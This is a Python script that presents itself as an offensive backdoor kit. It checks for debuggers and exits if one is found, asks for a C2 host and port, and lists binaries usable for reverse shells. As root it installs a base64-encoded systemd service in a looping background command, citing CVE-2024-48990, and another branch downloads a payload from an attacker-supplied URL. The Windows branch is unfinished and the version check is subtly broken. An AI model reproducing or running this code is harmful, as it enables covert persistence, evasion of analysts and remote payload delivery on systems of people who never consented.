#!/usr/bin/python3
# Author -> NullByte
# Welcome to your kit to break systems, yes break systems, do not like to talk "tool". What does it do? well allows persistence on the target system, windows/linux automatically identifies the operating system running,
# analyzes processes running debugger and thus terminates the backdoor, allows external payload or the backdoor itself so the attacker has more options to use, not only depending on the payload created by the backdoor,
#after that it encrypts the communication in order to avoid discoveries in the network by sysadmin,blue team. in the future I will implement new features, such as porting to golang.


import os
import sys
import platform
import psutil
from urllib.request import urlretrieve

def banner():
    print(r'''
       
           \`*-.                    
            )  _`-.                 
           .  : `. .                
           : _   '  \               
           ; *` _.   `*-._          
           `-.-'          `-.       
             ;       `       `.     
             :.       .        \    
             . \  .   :   .-'   .   
             '  `+.;  ;  '      :   
             :  '  |    ;       ;-. 
             ; '   : :`-:     _.`* ;
            .*' /  .*' ; .*`- +'  `*' 
            `*-*   `*-*  `*-*'

    H1D3 C4T ||NULLBYTE|| 
    ''')

def check_operating_system():
    print("-" * 48)
    print("[!] Checking Operating System...")
    
    os_name = platform.system().lower()
    if os_name in ["linux", "linux2", "darwin", "windows", "win32", "cygwin"]:
        return os_name
    else:
         print("[!] UNKNOW SYSTEM!? ALIEN???")
         sys.exit(1)

def check_debugger_linux():
     for proc in psutil.process_iter(['pid','name']):     
            debuggers = {'ghidra','gdb','strace'}
            for debug in debuggers:    
                if debug in proc.info['name'].lower():
                    print("[!] FOUND PROCESS DEBUGGER KILL BACKDOOR")
                    sys.exit(1)



def internal_backdoor_unix():

    print("[!] BACKDOOR IS INTERNAL")
    
    lhost = input("[$] SET YOUR C2 LHOST => ")
    lport = input("[$] SET YOUR C2 LPORT => ")
    
    print(f"[@] YOUR C2 {lhost}:{lport}, IMPLEMENTED PERSISTENCE...")

    binary_paths = ['/usr/bin/busybox', '/usr/local/bin/busybox', '/bin/busybox', '/usr/bin/nc',
                    '/usr/local/bin/nc', '/bin/nc', '/usr/bin/ncat', '/usr/local/bin/ncat',
                    '/bin/ncat', '/usr/bin/perl', '/usr/local/bin/perl', '/bin/perl',
                    '/usr/bin/python', '/usr/local/bin/python', '/bin/python', '/usr/bin/python3',
                    '/usr/local/bin/python3', '/bin/python3', '/usr/bin/ruby', '/usr/local/bin/ruby', '/bin/ruby']

    print("-" * 48)

    for binary in binary_paths:
        if os.path.exists(binary):
            print(f"[#] FOUND BINARY FOR REVERSE SHELL: {binary}")

    print("-" * 48)
    shell_paths = ['/bin/bash','/bin/sh', '/bin/zsh', '/usr/bin/zsh']
    print("-" * 48)


    for shell in shell_paths:
        if os.path.exists(shell):
            print(f"[@] SHELL IN MACHINE TARGET => {shell}")
    print("-" * 48)

    if os.getuid() == 0:
        print("[!] YOU ARE ROOT Checking target machine is vulnerable needrestart version 3.7")
        check_version_needrestart = os.system("needrestart --version | grep 3.7 | cut -d ' ' -f1,2")
        if str(check_version_needrestart).split("3.7"):
            user_input = input("[!] VERSION IS VULNERABLE DO YOU WANT IMPLEMENT THIS? <(For more information CVE-2024-48990)> y/n -> ").lower()
            if user_input == "y":
                print("[1337] IMPLEMENT PERSISTENCE!")
                Payload = "while true; do sleep 3; echo 'W1VuaXRdCkRlc2NyaXB0aW9uPVVwZGF0ZSBTeXN0ZW0KCltTZXJ2aWNlXQpUeXBlPXNpbXBsZQpFeGVjU3RhcnQ9L2Jpbi9iYXNoIC1jICJuZWVkcmVzdGFydCIKUmVzdGFydD1hbHdheXMKUmVzdGFydFNlYz01CgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQK' | base64 -d > /etc/systemd/system/update.service; systemctl enable update && systemctl start update && systemctl daemon-reload; sleep 10; done &"
                os.system(Payload)
            elif user_input == "n":
                print("[!] YOU ARE NOT WANT IMPLEMENT THIS PERSISTENCE")
            else:
                print("TRY AGAIN y/n 7w7")
        else:
            print("[!] TARGET MACHINE NOT VULNERABILITY VERSION NEEDRESTART :(")
    else:
            print("YOU ARE NOT ROOT!")
            sys.exit(1)
    print("-" * 48)



def external_backdoor_unix():

    print("[!] BACKDOOR IS EXTERNAL")
    user_input = input("[*] Is Your Payload On The Network Or On The Local Machine? surface/local => ").lower()

    if user_input == "surface":
        url_payload = input("[@] URL OF YOUR PAYLOAD => ")
        url_payload_dest = input("[#] PUT DESTINATION PATH FOR PAYLOAD (example /tmp/) => ")
        url_payload_name = input("[$] NAME YOUR PAYLOAD (example backdoor.sh)  => ")
        url = url_payload
        dst = url_payload_dest + url_payload_name
        urlretrieve(url, dst)
        if os.path.exists(dst):
            print(f"[7w7] Payload Found In -> {dst}")
            print("[1337] IMPLEMENTED PERSISTENCE IN PAYLOAD")
        else:
            print("[!] Payload Not Found => ")
            sys.exit(1)
    elif user_input == "local":
        path_payload = input("[#] PATH YOUR PAYLOAD => ")
        access_payload = os.path.exists(path_payload)
        if access_payload:
            print("[1337] IMPLEMENTED PERSITENCE IN PAYLOAD")
        else:
            print(f"[!] NOT FOUND PATH PAYLOAD TRY AGAIN! => {path_payload}")
    else:
        print("[!] ?????? TRY AGAIN -> surface or local")


if __name__ == "__main__":
    banner()

    os_name = check_operating_system()
    print("[!] Checking Anti-Malware/Debuggers Running...")
    check_debugger_linux()
    print("-" * 48)

    if os_name in ["linux", "linux2", "darwin"]:
        print("[!] UNIX BASED SYSTEM")
        user_input = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? [internal/external] => ").lower()
        if user_input == "internal":
            internal_backdoor_unix()
        elif user_input == "external":
            external_backdoor_unix()
        else:
            print("[!] Write internal or external try again! 7w7")
            sys.exit(1)

    elif os_name in ["windows", "win32", "cygwin"]:
        print("[!] WINDOWS SYSTEM!")
        choice_windows = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")

    else:
        print("[!] OPERATING SYSTEM UNKNOWN")
        sys.exit(1)
